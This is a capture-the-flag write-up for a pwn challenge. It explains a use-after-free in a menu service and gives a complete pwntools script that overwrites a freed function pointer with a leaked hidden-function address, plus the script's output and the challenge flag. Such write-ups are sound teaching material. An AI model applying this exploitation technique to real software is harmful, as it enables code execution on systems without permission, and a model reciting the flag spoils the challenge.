# UAF (Use After Free) Challenge Writeup

**Challenge Name:** UAF  
**Points:** 150  
**Category:** PWN  


![](attachments/Pasted%20image%2020251130131704.png)

## Initial Reconnaissance

Upon connecting to the service, we're presented with a menu system:

```
===== Welcome to UAF CTF =====
1 - Challenge List
2 - Create Player Account
3 - Inquire Player Account Deletion
4 - Submit Writeup
5 - Scoreboard
6 - Exit
```

### Key Findings

When selecting option 1 (Challenge List), we receive a crucial debug message:

```
[DEBUG] Hidden function at 0x80498a5
```

This reveals:
- A hidden function exists at memory address `0x80498a5`
- The application is likely a 32-bit binary (based on the address format)
- The developers left debug information enabled (common in CTF challenges)

---

## Understanding the Vulnerability

### What is Use After Free (UAF)?

A Use After Free vulnerability occurs when:
1. Memory is allocated for an object
2. The memory is freed (deallocated)
3. A pointer to that freed memory is used again (dangling pointer)
4. An attacker can allocate new data in the same memory location
5. The old pointer now points to attacker-controlled data

### Analyzing the Application Flow

1. **Create Player Account (Option 2):**
   - Allocates memory for a player structure
   - Likely stores player data and a function pointer
   - Stores the player name

2. **Delete Account (Option 3):**
   - Frees the player structure memory
   - **Bug:** The pointer is not set to NULL (classic UAF)
   - The freed memory can be reused

3. **Submit Writeup (Option 4):**
   - Accepts 8 bytes of data
   - Allocates memory for the writeup
   - **Critical:** May reuse the freed player structure memory

4. **The Exploit:**
   - When we submit a writeup after deleting our account, the 8 bytes we provide can overwrite the freed memory
   - If the player structure contained a function pointer, we can overwrite it with the hidden function address
   - The program later calls this function pointer, executing our injected address

---

## Exploitation Steps

### Step 1: Identify the Hidden Function
By selecting option 1, we discover the hidden function at `0x80498a5`. This function likely prints the flag.

### Step 2: Create and Delete an Account
```
2 - Create Player Account
  → Enter player name: "ExploitPlayer"
  → Account created (memory allocated)

3 - Inquire Player Account Deletion
  → Delete account: "Y"
  → Memory freed but pointer still exists (UAF!)
```

### Step 3: Trigger the UAF
```
4 - Submit Writeup
  → Submit 8 bytes containing the hidden function address
```

The 8-byte payload structure:
- Bytes 0-3: Hidden function address `0x80498a5` in little-endian format
- Bytes 4-7: Padding (null bytes)

In Python with pwntools:
```python
hidden_func = 0x80498a5
payload = p32(hidden_func).ljust(8, b'\x00')
# Result: b'\xa5\x98\x04\x08\x00\x00\x00\x00'
```

### Step 4: Execute and Get Flag
When the program processes our writeup, it:
1. Allocates memory for the writeup data
2. The allocator reuses the freed player structure memory
3. Our payload overwrites the function pointer in that memory
4. The program calls the function pointer, executing the hidden function
5. The hidden function prints the flag: `NOVA_CTF{u53_4ft3r_fr33_1s_d4ng3r0u5}`

---

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

# Connection details
HOST = '38.60.200.116'
PORT = 9003

# Connect to the service
io = remote(HOST, PORT)

# Receive initial menu
io.recvuntil(b'6 - Exit')

# Step 1: View challenge list to get the hidden function address
io.sendline(b'1')
response = io.recvuntil(b'6 - Exit')
print(response.decode())

# Step 2: Create a player account
io.sendline(b'2')
io.recvuntil(b'Enter your player name:')
io.sendline(b'ExploitPlayer')
io.recvuntil(b'6 - Exit')

# Step 3: Delete the account (creates UAF condition)
io.sendline(b'3')
io.recvuntil(b'(Y/N)')
io.sendline(b'Y')
io.recvuntil(b'6 - Exit')

# Step 4: Submit writeup with the hidden function address
hidden_func = 0x80498a5
payload = p32(hidden_func).ljust(8, b'\x00')

io.sendline(b'4')
io.recvuntil(b'Submit your writeup (8 bytes max):')
io.sendline(payload)

# Receive the flag
response = io.recvall(timeout=2)
print(response.decode())

io.close()
```


## The Result

```
python3 get_flag.py 
[+] Opening connection to 38.60.200.116 on port 9003: Done


[DEBUG] Hidden function at 0x80498a5
Here are UAF CTF challenges... Can you find the flag?

===== Welcome to UAF CTF =====
1 - Challenge List
2 - Create Player Account
3 - Inquire Player Account Deletion
4 - Submit Writeup
5 - Scoreboard
6 - Exit
[+] Receiving all data: Done (196B)
[*] Closed connection to 38.60.200.116 port 9003

NOVA_CTF{u53_4ft3r_fr33_1s_d4ng3r0u5}

===== Welcome to UAF CTF =====
1 - Challenge List
2 - Create Player Account
3 - Inquire Player Account Deletion
4 - Submit Writeup
5 - Scoreboard
6 - Exit
```


## Flag

`NOVA_CTF{u53_4ft3r_fr33_1s_d4ng3r0u5}`


![](attachments/Pasted%20image%2020251130132114.png)
